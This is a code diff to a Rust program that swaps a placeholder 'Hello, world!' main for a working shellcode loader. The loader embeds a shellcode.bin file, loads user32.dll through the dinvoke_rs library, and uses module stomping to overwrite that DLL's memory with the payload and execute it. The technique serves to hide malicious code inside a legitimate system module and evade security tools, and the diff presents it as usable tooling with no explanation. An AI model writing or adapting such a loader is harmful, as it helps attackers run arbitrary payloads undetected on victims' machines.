@@ -1,13 +1,26 @@
-use busywork::{BusyWork, Categories, Intensity};
+use dinvoke_rs::overload;
 
-// The provided shellcode
-static SHELLCODE: &[u8] = include_bytes!("../shellcode");
-
-fn random_behavior() {
-    let worker = Busywork::new(Intensity::High).allow(Categories::all()).run();
-}
-
+static SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
 
 fn main() {
-    println!("Hello, world!");
+    unsafe {
+        let shellcode_vec = SHELLCODE.to_vec();
+
+        let my_dll = dinvoke_rs::dinvoke::load_library_a("user32.dll");
+        if my_dll == 0 {
+            return;
+        }
+
+        let module = overload::managed_module_stomping(&shellcode_vec, 0, my_dll);
+
+        match module {
+            Ok((_original_bytes, stomp_address)) => {
+                let func: unsafe extern "system" fn() = std::mem::transmute(stomp_address);
+                func();
+            }
+            Err(e) => {
+                println!("Stomping failed: {}", e);
+            }
+        }
+    }
 }
